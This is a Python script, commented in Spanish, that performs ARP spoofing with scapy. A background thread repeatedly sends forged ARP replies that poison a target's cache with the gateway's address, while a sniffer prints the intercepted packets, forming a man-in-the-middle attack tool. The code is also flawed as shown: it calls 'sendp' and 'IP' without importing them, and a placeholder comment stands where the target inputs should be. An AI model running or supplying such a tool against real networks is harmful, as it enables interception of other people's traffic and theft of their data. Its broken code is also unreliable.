from scapy.all import ARP, Ether, send, sniff
import time
import sys
import threading

def arp_spoofing(targetIP, targetMAC, gatewayIP):
    """Envía paquetes ARP falsos continuamente para el envenenamiento."""
    paquete = Ether(dst=targetMAC) / ARP(op=2, pdst=targetIP, hwdst=targetMAC, psrc=gatewayIP)
    sendp(paquete, verbose=False)

def start_arp_spoof(targetIP, targetMAC, gatewayIP):
    """Bucle en segundo plano para mantener el ARP Spoofing activo."""
    try:
        while True:
            arp_spoofing(targetIP, targetMAC, gatewayIP)
            time.sleep(2)
    except:
        pass

def process_packet(packet):
    # Imprimimos cualquier paquete IP que involucre al objetivo para verificar que el sniffer sí ve tráfico
    if packet.haslayer('IP'):
        print(f"[+] Paquete capturado: {packet[IP].src} ---> {packet[IP].dst} | Protocolo: {packet.summary()}")

if __name__ == "__main__":
    # ... (tus inputs de IP, MAC y Gateway se quedan igual) ...

    print(f"\n[*] Iniciando ataque ARP Spoofing contra {targetIP}...")
    hilo_spoof = threading.Thread(target=start_arp_spoof, args=(targetIP, targetMAC, gatewayIP), daemon=True)
    hilo_spoof.start()

    print("[*] Sniffer activo. Escuchando tráfico en la red...")
    print("[*] Utilice CTRL + C para detener el ataque y la captura.\n")

    try:
        # Quitamos el filtro estricto por si la IP no coincide exactamente con el formato de la interfaz, 
        # y filtramos directamente en Python para asegurarnos de capturar todo lo que pase por la tarjeta.
        sniff(prn=process_packet, store=0)
    except KeyboardInterrupt:
        print("\n[!] El ataque y la captura se detuvieron correctamente.")
